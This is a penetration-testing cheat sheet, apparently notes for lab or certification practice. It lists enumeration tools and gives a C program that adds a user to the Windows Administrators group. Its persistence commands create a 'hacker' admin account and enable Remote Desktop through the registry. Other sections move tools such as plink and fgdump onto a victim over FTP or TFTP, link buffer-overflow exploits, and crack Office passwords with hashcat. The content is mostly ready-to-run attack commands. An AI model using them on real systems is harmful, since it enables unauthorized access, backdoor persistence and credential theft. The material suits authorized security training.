# Enum

- https://github.com/21y4d/nmapAutomator
- http://sparta.secforce.com/index.html#Download
- https://github.com/leebaird/discover

# Linux

```
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```

If compiler available, check for kernel exploits.

# Windows
Named pipes: https://github.com/peterpt/pipe_auditor_fb

Py to Exe:
- pywin32-218.win32-py2.7 pyinstaller-2.1
- python pyinstaller.py -­‐onefile	ms11-­080.py

Add user:
```
#include <stdlib.h>
int main ()
{
	int i;
	i=system ("net localgroup administrators lowpriv /add");
	return 0;
}
```

Persistence:
```
# Add Windows user:
net user /add hacker 1234567

# Add user to Administrators groups
net localgroup administrators /add hacker

# Add user to Remote Desktop user group
net localgroup "Remote Desktop users" hacker /add

# Start Remote Desktop service
net start TermService

# Is Remote Desktop Service running?
tasklist /svc | findstr /C:TermService

# Permanently enable Terminal Services
sc config TermService start=auto

# Enable Terminal services through registry  // reboot after
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

# File Transfer

FTP:
```
apt-get install python-pyftpdlib
python -m pyftpdlib -p 21

ftp> open 192.168.13.203
ftp> binary
  200 Type set to I.
ftp> put plink2.exe
```

TFTP:
```
msf > use auxiliary/server/tftp
msf auxiliary(tftp) > set TFTPROOT /some/folder"
TFTPROOT => /some/folder

msf auxiliary(tftp) > run
[*] Auxiliary module execution completed
msf auxiliary(tftp) >
[*] Starting TFTP server on 0.0.0.0:69...
[*] Files will be served from /some/folder
[*] Uploaded files will be saved in /tmp
msf auxiliary(tftp) >

From the Windows client:
TFTP.EXE -i 10.11.0.159 get fgdump.exe C:\Users\Public

#TFTP manual
https://technet.microsoft.com/en-us/library/ff698993(v=ws.11).aspx
```

## Buf practice
https://github.com/justinsteven/dostackbufferoverflowgood
SLMail: https://www.exploit-db.com/exploits/638/
C code in https://www.exploit-db.com/exploits/646/
FreeFloatFTP Server 1.0: https://www.exploit-db.com/exploits/17546/
Minishare 1.4.1: https://www.exploit-db.com/exploits/636/
Savant 3.1: https://www.exploit-db.com/exploits/10434/
WarFTPD 1.6.5: https://www.exploit-db.com/exploits/3570/

## Public Reports
https://github.com/juliocesarfort/public-pentesting-reports

## Office docs
```
python ./office2john.py ../file1.docx

oclHashcat -a 0 -m 9400 -status -o found.txt hash.txt pass.txt

Office 97-03(MD5+RC4,oldoffice$0,oldoffice$1): flag -m 9700
Office 97-03(MD5+RC4,collider-mode#1): flag -m 9710
Office 97-03(MD5+RC4,collider-mode#2): flag -m 9720
Office 97-03(SHA1+RC4,oldoffice$3,oldoffice$4): flag -m 9800
Office 97-03(SHA1+RC4,collider-mode#1): flag -m 9810
Office 97-03(SHA1+RC4,collider-mode#2): flag -m 9820
Office 2007: flag -m 9400
Office 2010: flag -m 9500
Office 2013: flag -m 9600
```
